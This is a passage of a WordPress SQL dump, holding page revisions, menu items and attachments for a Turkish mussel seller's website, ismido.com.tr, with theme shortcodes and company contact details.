[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Refik Osman Top Sokak Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-06-02 14:01:09","2014-06-02 11:01:09","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("925","1","2014-06-02 14:25:06","2014-06-02 11:25:06","Herkon yapı web sitesi yayın hayatına başlamıştır.","Herkon Yapı","","inherit","open","open","","924-revision-v1","","","2014-06-02 14:25:06","2014-06-02 11:25:06","","924","http://www.ismido.com.tr/924-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("924","1","2014-06-02 14:25:06","2014-06-02 11:25:06","ismido.com.tr yeni tasarımıyla sizlerle...","İsmido","","publish","open","open","","ismido-com","","","2017-03-10 10:26:01","2017-03-10 08:26:01","","0","http://www.ismido.com.tr/?p=924","0","post","","0");
INSERT INTO `cmrfu_posts` VALUES("915","1","2014-06-02 13:59:46","2014-06-02 10:59:46"," ","","","publish","open","closed","","915","","","2016-11-22 23:51:24","2016-11-22 21:51:24","","0","http://www.ismido.com.tr/?p=915","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("923","1","2014-06-02 14:23:20","2014-06-02 11:23:20","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Refik Osman Top Sok. Maçka İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 222 10 10[/list_item]
[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-06-02 14:23:20","2014-06-02 11:23:20","","447","http://www.ismido.com.tr/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("921","1","2014-06-02 14:14:49","2014-06-02 11:14:49"," ","","","publish","open","closed","","921","","","2017-01-25 21:24:07","2017-01-25 19:24:07","","0","http://www.ismido.com.tr/?p=921","5","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("919","1","2014-06-02 14:10:29","2014-06-02 11:10:29","","Projeler","","inherit","open","open","","918-revision-v1","","","2014-06-02 14:10:29","2014-06-02 11:10:29","","918","http://www.ismido.com.tr/918-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("918","1","2014-06-02 14:10:29","2014-06-02 11:10:29","","Ürünler","","publish","open","open","","urunler","","","2016-11-22 23:19:37","2016-11-22 21:19:37","","0","http://www.ismido.com.tr/?page_id=918","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("748","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","748","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/748/","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("749","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","749","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/749/","4","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("750","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","750","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/750/","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("751","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","751","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/751/","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("922","1","2014-06-02 14:15:14","2014-06-02 11:15:14","","Duyurular","","inherit","open","open","","454-revision-v1","","","2014-06-02 14:15:14","2014-06-02 11:15:14","","454","http://www.ismido.com.tr/454-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("759","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","759","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/759/","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("760","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","760","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/760/","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("761","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","761","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/761/","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("762","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","762","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/762/","6","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("763","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","763","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/763/","7","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("764","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","764","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","0","http://www.ismido.com.tr/764/","8","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("765","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","765","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/765/","10","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("766","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","766","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/766/","11","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("767","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","767","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/767/","12","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("768","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","768","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/768/","13","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("769","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","769","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/769/","14","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("770","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","770","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/770/","15","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("771","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","771","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/771/","16","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("772","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","772","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/772/","17","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("773","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","773","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/773/","18","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("774","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","774","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/774/","19","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("775","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","775","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/775/","20","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("776","1","2014-02-19 19:38:54","2014-02-19 17:38:54"," ","","","publish","open","open","","776","","","2014-02-19 19:38:54","2014-02-19 17:38:54","","196","http://www.ismido.com.tr/776/","21","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("777","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","777","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/777/","22","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("778","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","778","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/778/","23","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("779","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","779","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/779/","24","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("780","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","780","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/780/","25","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("781","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","781","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/781/","26","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("782","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","782","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/782/","27","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("783","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","783","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/783/","28","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("784","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","784","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/784/","29","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("785","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","785","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","196","http://www.ismido.com.tr/785/","30","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("786","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","786","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/786/","32","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("787","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","787","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/787/","33","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("788","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","788","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/788/","34","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("789","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","789","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","671","http://www.ismido.com.tr/789/","35","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("790","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","790","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","671","http://www.ismido.com.tr/790/","36","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("791","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","791","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","671","http://www.ismido.com.tr/791/","37","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("792","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","792","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/792/","39","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("793","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","793","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/793/","40","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("794","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","794","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/794/","41","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("795","1","2014-02-19 19:38:55","2014-02-19 17:38:55","","Filter 3 Columns","","publish","open","open","","filter-3-columns-2","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/filter-3-columns-2/","42","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("796","1","2014-02-19 19:38:55","2014-02-19 17:38:55","","Filter 2 Columns","","publish","open","open","","filter-2-columns-2","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/filter-2-columns-2/","43","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("797","1","2014-02-19 19:38:55","2014-02-19 17:38:55","","Portfolio Detail","","publish","open","open","","portfolio-detail-2","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/portfolio-detail-2/","44","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("798","1","2014-02-19 19:38:55","2014-02-19 17:38:55"," ","","","publish","open","open","","798","","","2014-02-19 19:38:55","2014-02-19 17:38:55","","0","http://www.ismido.com.tr/798/","45","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("799","1","2014-02-19 19:38:56","2014-02-19 17:38:56","","Blog Single","","publish","open","open","","blog-single-2","","","2014-02-19 19:38:56","2014-02-19 17:38:56","","0","http://www.ismido.com.tr/blog-single-2/","48","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("800","1","2014-02-19 19:38:56","2014-02-19 17:38:56"," ","","","publish","open","open","","800","","","2014-02-19 19:38:56","2014-02-19 17:38:56","","0","http://www.ismido.com.tr/800/","49","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("801","1","2014-02-19 19:38:56","2014-02-19 17:38:56"," ","","","publish","open","open","","801","","","2014-02-19 19:38:56","2014-02-19 17:38:56","","0","http://www.ismido.com.tr/801/","4","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("805","1","2014-02-19 20:56:05","2014-02-19 18:56:05","","bright_squares","","inherit","open","open","","bright_squares","","","2014-02-19 20:56:05","2014-02-19 18:56:05","","0","http://www.ismido.com.tr/wp-content/uploads/2014/02/bright_squares.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("817","1","2014-02-19 22:17:13","2014-02-19 20:17:13","","nophoto","","inherit","open","open","","nophoto","","","2014-02-19 22:17:13","2014-02-19 20:17:13","","186","http://www.ismido.com.tr/wp-content/uploads/2013/10/nophoto.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("818","1","2016-11-22 23:48:35","2016-11-22 21:48:35","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C /blok   No: 383   Bayrampaşa /istanbul[/list_item]
[list_item icon=\"envelope\"]info@ismido.com.tr[/list_item]
[list_item icon=\"phone-sign\"]+90 212 640 9562[/list_item]

[list_item icon=\"phone-sign\"]+90 534738 88 - 88[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-autosave-v1","","","2016-11-22 23:48:35","2016-11-22 21:48:35","","447","http://www.ismido.com.tr/447-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1060","1","2016-11-22 23:49:49","2016-11-22 21:49:49","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C /blok   No: 383   Bayrampaşa /istanbul[/list_item]
[list_item icon=\"envelope\"]info@ismido.com.tr[/list_item]
[list_item icon=\"phone-sign\"]+90 212 640 95 62[/list_item]

[list_item icon=\"phone-sign\"]+90 534 738 88 88[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","inherit","closed","closed","","447-revision-v1","","","2016-11-22 23:49:49","2016-11-22 21:49:49","","447","http://www.ismido.com.tr/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("822","1","2016-11-22 23:16:41","2016-11-22 21:16:41","","Kara Midye","","inherit","open","open","","186-autosave-v1","","","2016-11-22 23:16:41","2016-11-22 21:16:41","","186","http://www.ismido.com.tr/186-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1063","1","2016-11-22 23:54:47","2016-11-22 21:54:47","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Ürünlerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Bayilik Almak İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Bayilik Almak İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"https://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C blok   No: 383   Bayrampaşa Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Bayrampaşa Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C /blok   No: 383   Bayrampaşa Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","closed","closed","","524-revision-v1","","","2016-11-22 23:54:47","2016-11-22 21:54:47","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("996","1","2014-08-30 00:26:52","2014-08-29 21:26:52","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Binamı Yeniletmek İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Binamı Yeniletmek İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-08-30 00:26:52","2014-08-29 21:26:52","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("994","1","2014-08-29 23:48:52","2014-08-29 20:48:52","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-08-29 23:48:52","2014-08-29 20:48:52","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("913","1","2014-06-02 13:53:57","2014-06-02 10:53:57","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Home","","inherit","open","open","","524-revision-v1","","","2014-06-02 13:53:57","2014-06-02 10:53:57","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("837","1","2016-11-22 23:28:35","2016-11-22 21:28:35","","İç Midye","","inherit","open","open","","184-autosave-v1","","","2016-11-22 23:28:35","2016-11-22 21:28:35","","184","http://www.ismido.com.tr/184-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("914","1","2014-06-02 13:56:22","2014-06-02 10:56:22","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-06-02 13:56:22","2014-06-02 10:56:22","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("930","1","2014-08-29 22:28:33","2014-08-29 19:28:33","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 261 61 50 - 52[/list_item]

[list_item icon=\"phone-sign\"]+90 532 255 15 90[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-08-29 22:28:33","2014-08-29 19:28:33","","447","http://www.ismido.com.tr/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("931","1","2014-08-29 22:29:35","2014-08-29 19:29:35","[cols]
[col-9]

